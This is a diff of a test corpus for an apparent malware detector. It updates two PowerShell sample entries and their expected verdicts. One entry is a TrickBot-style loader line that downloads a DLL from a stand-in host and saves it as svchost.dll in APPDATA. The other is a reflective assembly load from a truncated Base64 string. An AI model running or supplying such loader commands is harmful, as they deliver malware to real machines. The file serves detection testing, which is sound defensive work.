@@ -135,13 +135,11 @@ MALWARE_R2: Tuple[Dict[str, Any], ...] = (
     {
         "id": "GC-275-trickbot-loader",
         "language": "powershell",
-        # TrickBot-style loader: WebClient.DownloadFile to fixed path.
-        # NOTE: The original PS variant with `$env:APPDATA + '\\name'`
-        # concatenation currently hangs the deterministic parser
-        # (`$env:VAR` in expression context is a coverage gap tracked
-        # for post-cutover). This variant preserves the malicious
-        # signature while keeping the corpus runnable.
-        "input": r"$w = New-Object System.Net.WebClient; $w.DownloadFile('http://trick.tld/x.dll', 'C:\Users\Public\svchost.dll')",
+        # TrickBot-style loader: WebClient.DownloadFile writing to
+        # `$env:APPDATA + '\<name>'`. Feb-2026 parser fix (`_parse_call_args`
+        # now consumes binary operators between atoms) unblocks the
+        # original malicious signature.
+        "input": r"$w = New-Object System.Net.WebClient; $w.DownloadFile('http://trick.tld/x.dll', $env:APPDATA + '\svchost.dll')",
         "expected": {"verdict_min": "Malicious"},
     },
     {
@@ -211,12 +209,13 @@ MALWARE_R2: Tuple[Dict[str, Any], ...] = (
         "id": "GC-284-snake-keylogger-ps",
         "language": "powershell",
         "input": r'[Reflection.Assembly]::Load([Convert]::FromBase64String("TVqQAAMAAAAEAAAA...ABCDE"))',
-        # NOTE: Reflective PE-load detection (T1620) requires a dedicated
-        # ReflectionNode → behavior mapping not yet in the current engine.
-        # Charter-blocked to add during shadow-run. Coverage-locked at
-        # Benign for now; test still exists to catch any accidental
-        # regression once T1620 mapping ships post-cutover.
-        "expected": {"verdict_min": "Benign"},
+        # Feb-2026: Reflective PE-load detection shipped. Interpreter
+        # emits `NodeKind.reflection`; MITRE mapper emits T1620 (Reflective
+        # Code Loading); verdict elevates to at least Suspicious.
+        "expected": {
+            "verdict_min": "Suspicious",
+            "mitre": ["T1620"],
+        },
     },
     {
         "id": "GC-285-socgholish-mshta",
